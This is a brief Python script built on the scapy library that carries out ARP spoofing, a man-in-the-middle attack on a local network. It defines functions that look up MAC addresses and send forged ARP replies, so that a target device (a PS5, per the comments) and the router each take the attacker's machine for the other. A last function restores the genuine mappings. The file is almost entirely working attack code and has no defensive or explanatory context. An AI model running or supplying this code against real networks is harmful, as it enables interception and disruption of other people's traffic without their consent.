import scapy.all as scapy

def get_device_info(ip):
    """Helper to retrieve MAC address."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    ans = scapy.srp(broadcast/arp_request, timeout=2, verbose=False)[0]
    if ans:
        return ans[0][1].hwsrc, "Known"
    return None, "Unknown"

def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """Sends spoofed packets with explicit Layer 2 destinations."""
    # Target Packet: Tells Target (PS5) that I am the Router
    target_packet = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    
    # Gateway Packet: Tells Router that I am the Target (PS5)
    gateway_packet = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    # Use sendp for Layer 2 (Ethernet)
    scapy.sendp(target_packet, count=4, verbose=False)
    scapy.sendp(gateway_packet, count=4, verbose=False)

def restore(destination_ip, source_ip):
    """Restores legitimate ARP mapping."""
    dest_mac, _ = get_device_info(destination_ip)
    src_mac, _ = get_device_info(source_ip)
    if dest_mac and src_mac:
        packet = scapy.Ether(dst=dest_mac)/scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        scapy.sendp(packet, count=5, verbose=False)
